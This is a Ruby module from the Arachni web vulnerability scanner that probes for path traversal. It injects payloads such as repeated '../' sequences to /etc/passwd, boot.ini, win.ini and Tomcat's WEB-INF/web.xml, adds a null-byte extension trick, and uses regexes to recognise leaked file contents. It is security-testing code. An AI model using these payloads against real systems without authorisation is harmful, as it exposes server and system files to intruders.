=begin
    Copyright 2010-2013 Tasos Laskos <tasos.laskos@gmail.com>

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
=end

#
# Path Traversal audit module.
#
# @author Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>
#
# @version 0.3.2
#
# @see http://cwe.mitre.org/data/definitions/22.html
# @see http://www.owasp.org/index.php/Path_Traversal
# @see http://projects.webappsec.org/Path-Traversal
#
class Arachni::Modules::PathTraversal < Arachni::Module::Base

    def self.options
        @options ||= {
            format: [Format::STRAIGHT],
            regexp: [
                /root:x:0:0:.+:[0-9a-zA-Z\/]+/im,
                /mail:x:\d+:\d+:.+:[0-9a-zA-Z\/]+/im,
                /\[boot loader\](.*)\[operating systems\]/im,
                /\[fonts\](.*)\[extensions\]/im,
                /<web\-app/im
            ],

            # Add one more mutation (on the fly) which will include the extension
            # of the original value (if that value was a filename) after a null byte.
            each_mutation: proc do |mutation|
                m = mutation.dup

                # Figure out the extension of the default value, if it has one.
                ext = m.original[m.altered].to_s.split( '.' )
                ext = ext.size > 1 ? ext.last : nil

                # Null-terminate the injected value and append the ext.
                m.altered_value += "\x00.#{ext}"

                # Pass our new element back to be audited.
                m
            end
        }
    end

    def self.payloads
        return @payloads if @payloads

        @payloads = {
            unix:    [ 'etc/passwd' ],
            windows: [
                'boot.ini',
                'windows/win.ini',
                'winnt/win.ini'
            ]
        }.inject({}) do |h, (platform, payloads)|
            h[platform] = [
                '/',
                '/../../../../../../../../../../../../../../../../'
            ].map do |trv|
                payloads.map do |payload|
                    [ "#{trv}#{payload}", "file://#{trv}#{payload}" ]
                end
            end.flatten
            h
        end

        @payloads[:tomcat] = [ '', '/', '/../../', '../../', ].map do |trv|
             [ "#{trv}WEB-INF/web.xml", "file://#{trv}WEB-INF/web.xml" ]
        end.flatten

        @payloads
    end

    def run
        audit self.class.payloads, self.class.options
    end

    def self.info
        {
            name:        'Path Traversal',
            description: %q{It injects paths of common files (/etc/passwd and boot.ini)
                and evaluates the existence of a path traversal vulnerability
                based on the presence of relevant content in the HTML responses.},
            elements:    [ Element::FORM, Element::LINK, Element::COOKIE, Element::HEADER ],
            author:      'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com> ',
            version:     '0.3.2',
            references:  {
                'OWASP' => 'http://www.owasp.org/index.php/Path_Traversal',
                'WASC'  => 'http://projects.webappsec.org/Path-Traversal'
            },
            targets:     %w(Unix Windows Tomcat),

            issue:       {
                name:            %q{Path Traversal},
                description:     %q{The web application enforces improper limitation
    of a pathname to a restricted directory.},
                tags:            %w(path traversal injection regexp),
                cwe:             '22',
                severity:        Severity::MEDIUM,
                cvssv2:          '4.3',
                remedy_guidance: %q{User inputs must be validated and filtered
    before being used as a part of a filesystem path.},
                remedy_code:     '',
                metasploitable:  'unix/webapp/arachni_path_traversal'
            }

        }
    end

end
